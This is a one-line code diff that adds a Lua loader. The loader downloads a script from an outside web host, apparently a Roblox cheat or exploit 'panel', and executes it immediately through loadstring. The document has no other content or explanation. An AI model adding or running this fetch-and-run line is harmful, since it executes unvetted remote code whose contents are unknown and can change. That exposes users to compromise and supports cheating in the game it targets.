@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://delux-panel-devz.squareweb.app/raw/loader"))()
